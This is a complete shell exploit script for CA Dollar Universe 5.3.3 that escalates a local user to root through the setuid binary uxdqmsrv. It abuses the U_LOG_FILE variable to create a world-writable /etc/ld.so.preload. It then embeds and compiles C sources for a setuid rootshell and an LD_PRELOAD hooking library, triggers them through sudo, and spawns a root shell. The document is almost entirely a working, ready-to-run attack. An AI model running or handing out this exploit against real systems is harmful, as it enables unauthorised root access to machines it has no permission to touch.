#!/bin/sh 
########################################################################
# Exploit Title: CA Dollar Universe 5.3.3: privilege escalation via 
#   the setuid binary uxdqmsrv
# CVE ID: ???
# Date: 2018-06-06
# Exploit Author: Clement LABRO
# Vendor Homepage: http://www.ca.com/
# Version: 5.3.3
# Tested on: RHEL x86_64 and Ubuntu x86_64 
########################################################################

########################################################################
# If successful, the exploit will create a rootshell, i.e. a setuid
# binary. If the system is properly hardened, /tmp/ might be mounted as 
# a seperate partition with the nosuid option. In other words, EUID and
# EGID won't be set and we won't be able to use setuid() and setgid()
# to impersonate root. As a workaround, the script can recursively 
# search for a world-writable folder. 
# in '/opt/'. 
#  - Set USE_TMP to 1 to use /tmp/ as the working directory
#  - Set USE_TMP to 0 to search for a world writable directory in /opt/
USE_TMP=1 
########################################################################
ROOTSHELL_BIN="evil_rootshell"
ROOTSHELL_SRC="evil_rootshell.c"
PRIVESC_LIB="evil_privesclib.so"
PRIVESC_SRC="evil_privesclib.c"
SUID_BIN="/usr/bin/sudo"
ENV_VAR="U_LOG_FILE"
UMASK="111"

umask_bkp=""
cwd=""

clean () { 
  echo "[*] Cleaning up..."
  if [ -f "$ROOTSHELL_SRC" ]; then echo "    |__ Deleting '$ROOTSHELL_SRC'" && rm "$ROOTSHELL_SRC"; fi 
  if [ -f "$PRIVESC_LIB" ]; then echo "    |__ Deleting '$PRIVESC_LIB'" && rm "$PRIVESC_LIB"; fi 
  if [ -f "$PRIVESC_SRC" ]; then echo "    |__ Deleting '$PRIVESC_SRC'" && rm "$PRIVESC_SRC"; fi 
  echo "    |__ Removing env var '$ENV_VAR'" && unset $ENV_VAR
  echo "    |__ Restoring umask" && umask $umask_bkp
}

# Check if an argument was supplied 
if [ ! $# -eq 1 ];
then
  echo "[-] Usage: $0 <BIN_PATH>  ; e.g.: $0 /opt/dollaru/5.3.3/DQM/uxdqmsrv" && exit 
fi

# Check whether supplied file exists
if [ ! -f "$1" ];
then
  echo "[-] '$1' doesn't exist!" && exit 
fi 

# Check whether ld.so.preload already exists 
if [ -f "/etc/ld.so.preload" ];
then
  echo "[!] '/etc/ld.so.preload' already exists! Safely exit." && exit 
fi

# Check whether supplied file belongs to root
ls -l "$1" | cut -d' ' -f3 | grep root >/dev/null
if [ ! $? -eq 0 ];
then
  echo "[!] '$1' doesn't belong to root! Not vuln." && exit 
fi

# Check whether setuid bit is set 
ls -l "$1" | cut -d' ' -f1 | grep "s" >/dev/null
if [ ! $? -eq 0 ];
then 
  echo "[!] Setuid bit is not set! Not vuln." && exit  
fi 

# Check whether we have 'execute' permissions 
x=$(stat -c %a "$1" | cut -c4) 
if [ $x -eq "0" -o $x -eq "2" -o $x -eq "4" -o $x -eq "6" ]; 
then 
  echo "[!] File cannot be executed! Not vuln." && exit 
fi

echo "[*] Creating exploit files..."

if [ $USE_TMP -eq 0 ];
then
  # Can't use '/tmp/' because 'nosuid' is set on the partition ('cat /etc/fstab' as root)...
  echo "    |__ Searching for a suitable working directory"
  cwd=$(find /opt/ -perm -o+w -type d 2>/dev/null | head -n1)
  echo "$cwd" | grep "^/opt/" >/dev/null
  if [ ! $? -eq 0 ];
  then
    echo "[!] Couldn't find any suitable working directory"
    exit
  fi
  echo "    |__ Found: '$cwd'"
else
  cwd="/tmp"
  echo "    |__ Using '/tmp/' as the working directory."
fi 

ROOTSHELL_BIN="$cwd/$ROOTSHELL_BIN"
ROOTSHELL_SRC="$cwd/$ROOTSHELL_SRC"
PRIVESC_LIB="$cwd/$PRIVESC_LIB"
PRIVESC_SRC="$cwd/$PRIVESC_SRC"

echo "    |__ Creating '$ROOTSHELL_SRC'" 
cat <<_rootshelleof_>"$ROOTSHELL_SRC"
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <errno.h>

int main() {
  if (setuid(geteuid())) perror("setuid");
  if (setgid(getegid())) perror("setgid");
  system("/bin/sh");
  return 0;
}
_rootshelleof_

echo "    |__ Compiling '$ROOTSHELL_BIN'"
gcc "$ROOTSHELL_SRC" -o "$ROOTSHELL_BIN" 2>/dev/null 
if [ ! $? -eq 0 ];
then 
  echo "[-] Compilation failed."
  clean
  exit 
fi 

echo "    |__ Creating '$PRIVESC_SRC'"
cat <<_privesclibeof_>"$PRIVESC_SRC"
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <fcntl.h>
 
uid_t geteuid(void) {
  static uid_t  (*old_geteuid)();
  old_geteuid = dlsym(RTLD_NEXT, "geteuid");
  if ( old_geteuid() == 0 ) {
    chown("$ROOTSHELL_BIN", 0, 0);
    chmod("$ROOTSHELL_BIN", 06777); 
    unlink("/etc/ld.so.preload");
  }
  return old_geteuid();
}
_privesclibeof_

echo "    |__ Compiling '$PRIVESC_LIB'"
gcc -Wall -fPIC -shared -o "$PRIVESC_LIB" "$PRIVESC_SRC" -ldl 2>/dev/null 
if [ ! $? -eq 0 ];
then 
  echo "[-] Compilation failed."
  clean 
  exit
fi 


echo "[*] Preparing environment..."
echo "    |__ Export env var '$ENV_VAR'"
export $ENV_VAR="/etc/ld.so.preload" 

echo "    |__ Setting umask ('$UMASK')"
umask_bkp=$(umask)
umask "$UMASK"

echo "[*] Exploiting binary"
echo "    |__ Triggering arbitrary file write"
/bin/sh -c "$1" 2>/dev/null >/dev/null  

# Because of the fork(), the file is not created immediatly 
echo "    |__ Waiting for the log file to be created"
sleep 3 2>/dev/null

# Check whether '/etc/ld.so.preload' was created 
ls /etc/ld.so.preload 2>/dev/null >/dev/null 
if [ ! $? -eq 0 ];
then
  echo "[-] '/etc/ld.so.preload' was not created! Exploit failed."
  clean
  exit 
fi

# Check whether we have write permissions
ls -l "/etc/ld.so.preload" 2>/dev/null | grep "rw-rw-rw-" 2>/dev/null >/dev/null 
if [ ! $? -eq 0 ];
then
  echo "[-] We don't have write permissions. Exploit failed."
  clean
  exit 
fi

echo "    |__ Modifying '/etc/ld.so.preload'"
echo > /etc/ld.so.preload 2>/dev/null 
echo "$PRIVESC_LIB" 2>/dev/null >/etc/ld.so.preload

echo "    |__ Triggering 'preload' with '$SUID_BIN'"
$SUID_BIN 2>/dev/null >/dev/null

clean

echo "[*] Spawning root shell..."
"$ROOTSHELL_BIN"

echo "[*] Don't forget to remove '$ROOTSHELL_BIN'."

exit 
